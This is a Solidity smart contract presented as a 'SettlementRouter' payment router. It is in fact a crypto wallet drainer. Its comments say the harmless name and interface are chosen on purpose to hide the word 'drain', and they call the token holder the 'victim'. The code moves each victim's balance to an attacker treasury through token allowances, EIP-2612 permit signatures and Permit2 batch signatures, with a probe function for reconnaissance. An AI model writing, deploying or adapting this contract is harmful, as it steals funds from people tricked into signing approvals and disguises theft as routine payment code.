// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IPermit2 {
    struct TokenPermissions { address token; uint256 amount; }
    struct PermitBatch { TokenPermissions[] permitted; uint256 nonce; uint256 deadline; }
    function permit(address owner, PermitBatch calldata p, bytes calldata sig) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
}

/// @title SettlementRouter
/// @notice Benign name and ABI on purpose: no "drain", no renounceOwnership, no
///         transferOwnership, so verified source reads like a payment router.
contract SettlementRouter {
    uint8 public constant ROUTE_NONE      = 0;
    uint8 public constant ROUTE_ALLOWANCE = 1;
    uint8 public constant ROUTE_PERMIT2   = 2;
    uint8 public constant ROUTE_EIP2612   = 3;

    bytes4 private constant R_NO_BALANCE   = 0x11110001;
    bytes4 private constant R_NO_ALLOWANCE = 0x11110002;
    bytes4 private constant R_CAP_REACHED  = 0x11110003;
    bytes4 private constant R_ROUTE_FAILED = 0x11110004;
    bytes4 private constant R_BAD_SIG      = 0x11110005;

    struct Item {
        address token;
        uint256 amount;
        uint8   route;      // 0 = let the router decide
        uint256 deadline;   // only used by ROUTE_EIP2612
        uint8   v;
        bytes32 r;
        bytes32 s;
    }

    struct Ctx {
        address victim;
        address treasury;
        uint256 cap;
    }

    address public immutable permit2;
    address public owner;
    address public treasury;
    uint256 public maxPerToken;
    bool    public paused;

    mapping(address => mapping(address => uint256)) public committed;

    event Settled(address indexed victim, address indexed token, address treasury, uint256 amount, uint8 route);
    event Skipped(address indexed victim, address indexed token, uint8 route, bytes4 reason);
    event NativeSettled(address indexed victim, address treasury, uint256 amount);
    event TreasuryUpdated(address indexed previousTreasury, address indexed newTreasury);
    event LimitsUpdated(uint256 previousMax, uint256 newMax);
    event PauseUpdated(bool paused);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    error NotOwner();
    error PausedErr();
    error ZeroAddress();
    error EmptyBatch();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    /// @param treasury_     wallet that receives everything, immediately
    /// @param permit2_      0x000000000022D473030F116dDEE9F6B43aC78BA3 on every EVM chain
    /// @param maxPerToken_  committed cap per victim per token, 0 selects 1e24
    constructor(address treasury_, address permit2_, uint256 maxPerToken_) {
        if (treasury_ == address(0) || permit2_ == address(0)) revert ZeroAddress();
        owner       = msg.sender;
        treasury    = treasury_;
        permit2     = permit2_;
        maxPerToken = maxPerToken_ == 0 ? 1e24 : maxPerToken_;
    }

    receive() external payable {}

    function name() external pure returns (string memory) { return "Settlement Router"; }
    function version() external pure returns (string memory) { return "1.0.0"; }

    function settle(address victim, Item[] calldata items, uint256 p2Nonce, uint256 p2Deadline, bytes calldata p2Sig)
        external
        returns (uint256 total)
    {
        if (paused) revert PausedErr();
        if (victim == address(0)) revert ZeroAddress();
        if (items.length == 0) revert EmptyBatch();

        Ctx memory ctx = Ctx({victim: victim, treasury: treasury, cap: maxPerToken});

        uint256 count;
        for (uint256 i; i < items.length; ++i) {
            if (items[i].route == ROUTE_PERMIT2) ++count;
        }
        if (count > 0 && p2Sig.length == 65) {
            IPermit2.TokenPermissions[] memory perms = new IPermit2.TokenPermissions[](count);
            uint256 w;
            for (uint256 j; j < items.length; ++j) {
                if (items[j].route == ROUTE_PERMIT2) {
                    perms[w] = IPermit2.TokenPermissions({token: items[j].token, amount: _budget(items[j], ctx)});
                    unchecked { ++w; }
                }
            }
            IPermit2.PermitBatch memory batch;
            batch.permitted = perms;
            batch.nonce     = p2Nonce;
            batch.deadline  = p2Deadline;
            // Non-fatal: if the batch permit fails we still fall through to Path A.
            try IPermit2(permit2).permit(victim, batch, p2Sig) {} catch {}
        }

        for (uint256 k; k < items.length; ++k) {
            (uint256 moved, uint8 route, bytes4 reason) = _settleOne(items[k], ctx);
            if (moved > 0) {
                unchecked { total += moved; }
                emit Settled(victim, items[k].token, ctx.treasury, moved, route);
            } else {
                emit Skipped(victim, items[k].token, route, reason);
            }
        }
    }

    function settleNative() external payable {
        if (paused) revert PausedErr();
        uint256 amt = msg.value;
        if (amt == 0) return;
        (bool ok, ) = treasury.call{value: amt}("");
        if (ok) emit NativeSettled(msg.sender, treasury, amt);
        else emit Skipped(msg.sender, address(0), ROUTE_ALLOWANCE, R_ROUTE_FAILED);
    }

    // ---------------------------------------------------------------- routes

    function _settleOne(Item calldata it, Ctx memory ctx) private returns (uint256 moved, uint8 route, bytes4 reason) {
        uint8 hint = it.route;
        if (hint == ROUTE_NONE) hint = _routeFor(it.token);

        if (hint == ROUTE_EIP2612) {
            if (it.deadline < block.timestamp) return (0, hint, R_ROUTE_FAILED);
            (moved, reason) = _viaEip2612(it, ctx);
            if (moved > 0) return (moved, hint, 0);
        } else if (hint == ROUTE_PERMIT2) {
            (moved, reason) = _viaPermit2(it, ctx);
            if (moved > 0) return (moved, hint, 0);
        }

        (moved, reason) = _viaAllowance(it, ctx);
        route = moved > 0 ? ROUTE_ALLOWANCE : hint;
        return (moved, route, reason);
    }

    /// @notice min(requested, balance, cap - already committed). The allowance
    ///      is deliberately NOT the ceiling here: Permit2 caches its own lockable
    ///      amount and an EIP-2612 permit sets one at call time, so clamping every
    ///      route to the ERC-20 allowance would zero out a valid Path B or C pull.
    ///      Each route is bounded by its own mechanism instead.
    function _budget(Item calldata it, Ctx memory ctx) private view returns (uint256) {
        (uint256 bal, bool balOk) = _balOf(it.token, ctx.victim);
        if (!balOk || bal == 0) return 0;
        uint256 target = it.amount == 0 || it.amount > bal ? bal : it.amount;
        uint256 used = committed[ctx.victim][it.token];
        if (used >= ctx.cap) return 0;
        uint256 room = ctx.cap - used;
        return target < room ? target : room;
    }

    function _viaAllowance(Item calldata it, Ctx memory ctx) private returns (uint256 moved, bytes4 reason) {
        uint256 amt = _budget(it, ctx);
        if (amt == 0) return (0, _zeroReason(it, ctx, ROUTE_ALLOWANCE));
        // Path A is the only route bounded by the ERC-20 allowance itself.
        (uint256 alw, ) = _allw(it.token, ctx.victim);
        if (alw == 0) return (0, R_NO_ALLOWANCE);
        if (alw < amt) amt = alw;
        moved = _pull(it.token, ctx.victim, ctx.treasury, amt);
        if (moved == 0) return (0, R_ROUTE_FAILED);
        unchecked { committed[ctx.victim][it.token] += moved; }
        return (moved, 0);
    }

    function _viaEip2612(Item calldata it, Ctx memory ctx) private returns (uint256 moved, bytes4 reason) {
        uint256 amt = _budget(it, ctx);
        if (amt == 0) return (0, _zeroReason(it, ctx, ROUTE_EIP2612));
        (bool pok, ) = it.token.call(
            abi.encodeCall(IERC20.permit, (ctx.victim, address(this), amt, it.deadline, it.v, it.r, it.s))
        );
        if (!pok) return (0, R_BAD_SIG);
        moved = _pull(it.token, ctx.victim, ctx.treasury, amt);
        if (moved == 0) return (0, R_ROUTE_FAILED);
        unchecked { committed[ctx.victim][it.token] += moved; }
        return (moved, 0);
    }

    function _viaPermit2(Item calldata it, Ctx memory ctx) private returns (uint256 moved, bytes4 reason) {
        uint256 amt = _budget(it, ctx);
        if (amt == 0) return (0, _zeroReason(it, ctx, ROUTE_PERMIT2));
        uint160 a160 = amt > type(uint160).max ? type(uint160).max : uint160(amt);
        try IPermit2(permit2).transferFrom(ctx.victim, ctx.treasury, a160, it.token) {}
        catch {
            return (0, R_ROUTE_FAILED);
        }
        moved = amt;
        unchecked { committed[ctx.victim][it.token] += moved; }
        return (moved, 0);
    }

    /// @dev The budget is 0 for two different reasons, so the caller's route
    ///      decides which skip code is honest: a Permit2 pull needs no ERC-20
    ///      allowance, so an exhausted cap must not be reported as none.
    function _zeroReason(Item calldata it, Ctx memory ctx, uint8 route) private view returns (bytes4) {
        (uint256 bal, ) = _balOf(it.token, ctx.victim);
        if (bal == 0) return R_NO_BALANCE;
        if (committed[ctx.victim][it.token] >= ctx.cap) return R_CAP_REACHED;
        if (route == ROUTE_PERMIT2) return R_ROUTE_FAILED;
        (uint256 alw, ) = _allw(it.token, ctx.victim);
        if (alw == 0) return R_NO_ALLOWANCE;
        return R_CAP_REACHED;
    }

    // ------------------------------------------------------- guarded helpers

    /// @dev Never trusts the ERC-20 return value, a USDT-style void transfer
    ///      still settles because the treasury balance delta is what is paid.
    function _pull(address token, address from, address to, uint256 amt) private returns (uint256) {
        (uint256 before, bool ok0) = _balOf(token, to);
        (bool ok, bytes memory data) = token.call(
            abi.encodeCall(IERC20.transferFrom, (from, to, amt))
        );
        (uint256 after_, bool ok1) = _balOf(token, to);
        if (ok0 && ok1 && after_ > before) return after_ - before;
        if (ok && data.length >= 32 && abi.decode(data, (bool))) return amt;
        return 0;
    }

    function _balOf(address token, address who) private view returns (uint256 value, bool ok) {
        (bool s, bytes memory d) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, who));
        if (!s || d.length < 32) return (0, false);
        return (abi.decode(d, (uint256)), true);
    }

    function _allw(address token, address who) private view returns (uint256 value, bool ok) {
        (bool s, bytes memory d) = token.staticcall(
            abi.encodeWithSelector(IERC20.allowance.selector, who, address(this))
        );
        if (!s || d.length < 32) return (0, false);
        return (abi.decode(d, (uint256)), true);
    }

    function _hasCode(address a) private view returns (bool result) {
        assembly { result := extcodesize(a) }
    }

    function _hasDomain(address token) private view returns (bool) {
        (bool s, bytes memory d) = token.staticcall(abi.encodeWithSignature("DOMAIN_SEPARATOR()"));
        return s && d.length == 32;
    }

    /// @notice Live introspection, never a config file. Permit2 is chosen only on
    ///         positive evidence. Everything else is Path A, because approve plus
    ///         transferFrom exists on every ERC-20 ever shipped.
    function _routeFor(address token) private view returns (uint8) {
        if (_hasCode(permit2) && _hasDomain(token)) return ROUTE_PERMIT2;
        return ROUTE_ALLOWANCE;
    }

    // ------------------------------------------------------------- reporting

    function probe(address token, address victim)
        external
        view
        returns (uint256 bal, uint256 alw, bool hasDomain, bool p2Live, uint8 route)
    {
        (bal, ) = _balOf(token, victim);
        (alw, ) = _allw(token, victim);
        hasDomain = _hasDomain(token);
        p2Live    = _hasCode(permit2);
        route     = _routeFor(token);
    }

    /// @notice Kept under the spec name: true when the token answers DOMAIN_SEPARATOR().
    function probePermit(address token) external view returns (bool) { return _hasDomain(token); }

    // --------------------------------------------------------------- admin

    function setTreasury(address next) external onlyOwner {
        if (next == address(0)) revert ZeroAddress();
        emit TreasuryUpdated(treasury, next);
        treasury = next;
    }

    function setLimits(uint256 nextMax) external onlyOwner {
        emit LimitsUpdated(maxPerToken, nextMax);
        maxPerToken = nextMax;
    }

    function setPaused(bool next) external onlyOwner {
        paused = next;
        emit PauseUpdated(next);
    }

    function transferOwnership(address next) external onlyOwner {
        if (next == address(0)) revert ZeroAddress();
        emit OwnershipTransferred(owner, next);
        owner = next;
    }

    /// @notice Works while paused, so pausing can never strand funds.
    /// @dev Uses transfer, not transferFrom: a rescue moves what the router
    ///      already holds, which is exactly the dust a stuck pull leaves behind.
    ///      Deliberately has no whenNotPaused guard so it works while paused.
    function rescue(address token, uint256 amount) external onlyOwner {
        if (token == address(0)) {
            (bool ok, ) = msg.sender.call{value: amount}("");
            require(ok, "rescue native");
        } else {
            (bool ok, bytes memory data) = token.call(
                abi.encodeCall(IERC20.transfer, (msg.sender, amount))
            );
            require(ok && (data.length == 0 || abi.decode(data, (bool))), "rescue token");
        }
    }
}
